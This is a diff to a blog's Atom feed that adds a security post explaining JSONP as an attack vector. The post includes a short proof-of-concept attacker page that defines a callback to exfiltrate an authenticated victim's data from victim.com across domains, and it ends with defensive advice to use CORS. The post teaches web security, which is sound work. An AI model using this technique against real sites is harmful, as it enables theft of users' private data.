@@ -4,7 +4,7 @@
   <title><![CDATA[ahmsec]]></title>
   <link href="http://ahmsec.github.io/atom.xml" rel="self"/>
   <link href="http://ahmsec.github.io/"/>
-  <updated>2016-07-04T01:39:51-05:00</updated>
+  <updated>2016-07-05T16:34:45-05:00</updated>
   <id>http://ahmsec.github.io/</id>
   <author>
     <name><![CDATA[Ahmad Khan]]></name>
@@ -12,6 +12,70 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[The Dangers of JSONP]]></title>
+    <link href="http://ahmsec.github.io/blog/2016/07/05/the-dangers-of-jsonp/"/>
+    <updated>2016-07-05T16:34:03-05:00</updated>
+    <id>http://ahmsec.github.io/blog/2016/07/05/the-dangers-of-jsonp</id>
+    <content type="html"><![CDATA[<p>This post is about how I learned of JSONP as an attack vector. This isn&rsquo;t a new vulnerability, but it&rsquo;s just nice that I discovered it on my own.</p>
+
+<h3>A note on Same-Origin Policy</h3>
+
+<p>Same-Origin Policy (SOP) prevents a webpage from reading data on a different domain. So if you open a tab with hacker.com, your browser wont let it read data on bank.com. There are notable exceptions, like <code>&lt;img&gt;</code> and <code>&lt;script&gt;</code> tags. However, browsers strictly limit their scope. For example, a webpage can only execute a cross-domain script, not read its contents.</p>
+
+<h3>Some interesting behavior</h3>
+
+<p>Playing with traffic in Burp I observed the following behavior. Whatever you pass in the &ldquo;callback&rdquo; parameter is reflected in the response.</p>
+
+<p>Request: <code>GET /sensitive_resource?callback=myFunction</code> <br/>
+Response: <code>myFunction({"key1":"data1", "key2":"data2", ...})</code></p>
+
+<p>Request: <code>GET /sensitive_resource?callback=AAAAAAAA</code> <br/>
+Response: <code>AAAAAAAA({"key1":"data1", "key2":"data2", ...})</code></p>
+
+<p>My first instinct was to test for XSS, but all output was correctly encoded. The response contained private data, but it required an authenticated session to access.</p>
+
+<p>(Later on I learned that this request/response behavior is an old technique called JSONP. It was used to get around Same-Origin Policy restrictions before CORS came about.)</p>
+
+<h3>The exploit</h3>
+
+<p>What if we request that resource from a <code>&lt;script&gt;</code> tag on the attacker&rsquo;s webpage? Notice that the response data is wrapped with a JavaScript function call that we control. Can we pre-define that function on the attacker&rsquo;s webpage?</p>
+
+<p><strong>www.attacker.com:</strong></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">exfil_function</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nx">parsed_data</span> <span class="o">=</span> <span class="nx">response_specific_parsing</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+</span><span class='line'>  <span class="nx">alert</span><span class="p">(</span><span class="nx">parsed_data</span><span class="p">);</span>
+</span><span class='line'>  <span class="nx">exfil</span><span class="p">(</span><span class="nx">parsed_data</span><span class="p">);</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'><span class="nt">&lt;/script&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&quot;https://www.victim.com/sensitive_resource?callback=exfil_function&quot;</span><span class="nt">&gt;</span> <span class="nt">&lt;/script&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And it works! The cross-domain script executes <code>exfil_function({"key1":"data1", "key2":"data2", ...})</code>, and since we control the definition of <code>exfil_function</code>, we can have it read the data!</p>
+
+<p>Now when an authenticated victim views this malicious webpage, it does a cross-domain read of the sensitive resource and exfiltrates the private data.</p>
+
+<h3>Lesson: don&rsquo;t use JSONP with private data</h3>
+
+<p>JSONP effectively disables Same-Origin Policy for a resource. So be cautious of using it with private data. Instead, use CORS, which gives you fine-grained and securely designed control over cross-origin sharing.</p>
+
+<p>Slightly related but maybe for another day: <a href="http://haacked.com/archive/2009/06/25/json-hijacking.aspx/">JSON Hijacking</a>. In conclusion, do not return sensitive data wrapped in JavaScript functions or arrays.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Custom Headers as CSRF Defense]]></title>
